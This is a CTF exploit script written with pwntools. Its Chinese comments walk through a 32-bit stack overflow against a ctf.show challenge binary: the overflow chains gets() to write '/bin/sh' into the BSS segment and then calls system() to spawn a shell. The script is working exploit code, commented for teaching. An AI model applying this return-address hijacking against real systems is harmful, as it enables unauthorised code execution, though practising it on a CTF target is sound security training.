from pwn import *

p = remote('pwn.challenge.ctf.show', 28162)
elf = ELF('../code/pwn')

# offset = 0x6c + 4：计算32位程序的栈溢出偏移量
# 0x6c：缓冲区到saved ebp的距离（通过IDA或cyclic计算）
# 4：saved ebp的大小（32位程序）
# 总偏移量 = 0x6c + 4 = 0x70，定位到返回地址
offset = 0x6c + 4

# gets_addr = 0x8048420：gets函数的地址
# gets函数用于读取输入并写入指定地址，不检查输入长度
gets_addr = 0x8048420

# bss_addr = 0x804B061：BSS段的地址
# BSS段用于存储全局变量和静态变量，通常具有可读写权限
# 选择BSS段作为写入"/bin/sh"的目标地址
bss_addr = 0x804B061

# sys_addr = 0x8048450：system函数的地址
# 通过IDA分析程序找到的system函数地址
sys_addr = 0x8048450

# payload构造分析：
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(gets_addr)：覆盖返回地址为gets函数地址
# p32(sys_addr)：gets函数的返回地址，即gets执行完后跳转到system
# p32(bss_addr)：gets函数的参数，指定写入地址为BSS段
# p32(bss_addr)：system函数的参数，指向BSS段中存储的"/bin/sh"字符串
# 32位调用约定：参数通过栈传递，从右到左入栈
payload = b'a' * offset + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)

p.sendline(payload)  # 发送第一次payload，触发gets调用

p.send('/bin/sh\x00')  # 发送"/bin/sh"字符串，被gets写入BSS段

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 32位 + BSS写入
2. 核心思路：
   - 程序中没有现成的/bin/sh字符串
   - 利用gets函数向BSS段写入"/bin/sh"，再调用system
3. payload结构分析：
   b'a' * offset     - 填充到返回地址
   + p32(gets_addr)  - 调用gets函数
   + p32(sys_addr)   - gets返回后调用system
   + p32(bss_addr)   - gets的参数（写入地址）
   + p32(bss_addr)   - system的参数（/bin/sh地址）
4. 执行流程：
   - 第一次溢出：跳转到gets(bss_addr)
   - gets执行，等待输入，将"/bin/sh"写入bss_addr
   - gets返回，跳转到system(bss_addr)
   - system执行，获得shell
5. BSS段：存储全局变量和静态变量，通常可读写
6. 关键：理解函数调用链的构造
"""
